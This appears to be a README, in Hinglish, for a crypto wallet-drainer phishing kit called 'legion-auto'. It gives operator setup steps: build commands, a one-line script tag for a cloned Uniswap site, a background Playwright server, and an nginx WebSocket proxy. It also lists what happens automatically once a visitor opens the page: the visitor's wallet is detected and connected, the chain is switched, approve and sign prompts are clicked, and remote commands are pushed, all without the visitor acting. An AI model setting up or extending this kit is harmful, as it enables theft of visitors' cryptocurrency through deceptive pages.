# Zero Config — Visitor Sirf Site Kholta Hai

## Visitor ko kya karna hai?

**Kuch nahi.** Sirf URL kholo.

## Operator ko kya karna hai? (ek baar setup)

### 1. Build with your domain

```powershell
cd standalone-browser-automation
npm run build -- --ws wss://tumhari-site.com/legion-ws
```

### 2. Site par sirf EK line

```html
<script src="./legion-auto.js" defer></script>
```

Koi config, koi CDP, koi extra script — **nahi**.

### 3. Server background mein chalao

```powershell
$env:METAMASK_EXTENSION_PATH="C:\path\to\metamask"
$env:METAMASK_PASSWORD="TestPassword123!"
npm run visitor-server -- --port 8791
```

### 4. Nginx WebSocket proxy (same domain)

```nginx
location /legion-ws {
    proxy_pass http://127.0.0.1:8791;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
    proxy_set_header Host $host;
}
```

Visitor `wss://tumhari-site.com/legion-ws` auto connect — **same domain, zero config**.

---

## Visitor aate hi agent khud kya karta hai

| Step | Auto? |
|------|-------|
| Wallet detect | ✅ |
| Wallet connect try | ✅ |
| Chain switch | ✅ |
| In-page approve/sign click | ✅ |
| Extension assist burst | ✅ |
| Server WebSocket connect | ✅ |
| Playwright mirror spawn | ✅ |
| Server extension bot | ✅ |
| Remote commands visitor ko | ✅ |

---

## Flow

```
Visitor → site.com khola
    ↓
legion-auto.js (zero config)
    ↓
WebSocket → tumhara server
    ↓
Playwright mirror + extension bot + remote click
    ↓
Sab automatic — visitor ne kuch nahi kiya
```

---

## Local test

```powershell
npm run build
npm run visitor-server
npx serve ../clones/uniswap-clone -p 3456
```

Chrome: `http://localhost:3456` — script auto `ws://127.0.0.1:8791`

---

## Ek limit (sach)

Visitor ke **phone** par MetaMask **app** ka popup — browser script control nahi kar sakti (Apple/Google security).

**PC browser** par: in-page sab auto + server mirror. Wallet extension Confirm — mostly user ek click; server mirror parallel try karta hai.

---

## Files

| File | Role |
|------|------|
| `agent-bootstrap.js` | Zero config defaults |
| `dist/legion-auto.js` | Single script visitor load |
| `playwright-visitor-server.mjs` | Background agent brain |
